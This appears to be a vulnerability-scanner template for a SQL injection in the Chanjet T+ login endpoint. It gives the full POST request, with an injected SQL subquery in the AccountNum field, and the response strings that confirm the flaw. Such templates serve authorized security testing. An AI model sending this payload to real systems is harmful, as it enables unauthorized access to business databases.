id: chanjet-tplus-ufida-sqli
brief:
    title: Chanjet TPluse Ufida.T.SM.Login.UIP - SQL injection
    by: SleepingBag945
    level: high
    about: Chanjet TPluse application has a SQL injection vulnerability, which can be used by attackers to obtain sensitive information in the database.
    label:
        - yonyou
        - chanjet
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword'
      head:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      body: '{"AccountNum":"123 or 8767 IN (SELECT (sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''1''))))","UserName":"admin","Password":"e10adc3949ba59abbe56e057f20f883e","rdpYear":"2021","rdpMonth":"12","rdpDate":"9","webServiceProcessID":"admin","ali_csessionid":"","ali_sig":"","ali_token":"","ali_scene":"","role":"","aqdKey":"","fromWhere":"browser","cardNo":""}'
      signs:
        - "on": word
          has:
            - 0x06d49632c9dc9bcb62aeaef99612ba6b
            - Message":"245
            - DatabaseException
          in: body
          need: all
